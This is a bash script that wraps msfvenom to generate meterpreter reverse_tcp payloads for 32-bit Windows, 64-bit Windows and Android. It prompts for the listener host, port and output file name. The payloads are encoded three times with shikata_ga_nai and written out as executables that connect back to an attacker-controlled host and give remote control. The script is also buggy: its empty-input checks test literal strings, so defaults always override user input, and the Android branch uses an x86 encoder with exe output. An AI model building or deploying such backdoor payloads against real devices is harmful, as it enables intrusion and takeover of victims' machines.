#!/usr/bin/env bash

payloadscr=payloads/resource
payloadscripts=payloads/scripts

if [ $# -ne 1 ]
then
    echo "ERROR : Arguments ....."
fi

# displaying todo ........
cat $payloadscr/msfvenom_welcome
echo -e "\n"

read -p "Enter the payload (default meterpreter/reverse_tcp): " msfpayload
if [ ! -z msfpayload ]
then
    if [ "$1" == "Android" ]
    then
        msfpayload="android/meterpreter/reverse_tcp"
    else
        msfpayload="windows/meterpreter/reverse_tcp"
    fi
fi

read -p "Enter IP of LHOST (default your active hardware IP): " msfip
if [ ! -z msfip ]
then
    msfip="$(ifconfig | grep -i "broadcast" | grep inet | awk '{print $2}')"
fi

read -p "Enter LPORT (default 4444):" msfport
if [ ! -z msfip ]
then
    msfport="4444"
fi

read -p "Enter the Output File name (default payload.exe): " msfoutput
if [ ! -z msfip ]
then
    if [ "$1" == "Android" ]
    then
        msfoutput="payload.apk"
    else
        msfoutput="payload.exe"
    fi
fi

if [ $1 -eq 32 ]
then
    echo "Generating payload for 32-bit windows ............. "
    echo "msfvenom -a x86 --platform windows -p $msfpayload LHOST=$msfip LPORT=$msfport -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o $msfoutput"
    msfvenom -a x86 --platform windows -p $msfpayload LHOST=$msfip LPORT=$msfport -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o $msfoutput
    echo "Done"
    exit 0
elif [ $1 -eq 64 ]
then
    echo "Generating payload for 64-bit windows ............. "
    echo "msfvenom --platform windows -p $msfpayload LHOST=$msfip LPORT=$msfport -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o $msfoutput"
    msfvenom --platform windows -p $msfpayload LHOST=$msfip LPORT=$msfport -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o $msfoutput
    echo "Done"
    exit 0
elif [ "$1" == "Android" ]
then
    echo "Generating payload for Android ............."
    echo "msfvenom --platform android -p $msfpayload LHOST=$msfip LPORT=$msfport -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o $msfoutput"
    msfvenom --platform android -p $msfpayload LHOST=$msfip LPORT=$msfport -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o $msfoutput
    echo "Done"
    exit 0
fi